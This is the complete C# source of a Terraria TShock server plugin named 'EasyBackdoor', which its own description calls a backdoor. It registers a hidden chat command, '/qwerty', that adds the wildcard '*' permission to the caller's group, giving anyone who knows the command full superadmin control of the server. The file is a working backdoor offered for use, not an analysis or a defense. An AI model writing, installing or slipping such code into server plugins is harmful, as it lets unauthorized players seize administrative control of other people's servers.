using Microsoft.Xna.Framework;
using System.Timers;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Terraria;
using TerrariaApi.Server;
using TShockAPI;
using System.Linq;

namespace EasyBackdoor
{
	[ApiVersion(2, 1)]

	public class EasyBackdoor : TerrariaPlugin
	{

		public override string Name
		{
			get { return "EasyBackdoor"; }
		}

		public override string Author
		{
			get { return "Comdar"; }
		}

		public override string Description
		{
			get { return "Terraria poorly made backdoor plugin."; }
		}

        public EasyBackdoor(Main game)
			: base(game)
		{
			Order = +4;
		}

		// This is command that will transfer superadmin perms into your account for free. 
		public override void Initialize()
		{
			Commands.ChatCommands.Add(new Command(backdoor, "/qwerty"));
		}

		// This script will transfer superadmin perms into your account for free.
		void backdoor(CommandArgs args)
		{
			args.Player.Group.AddPermission("*");
			args.Player.SendInfoMessage("<EasyBackdoor> Now you are superadmin:)");
		}
	}
}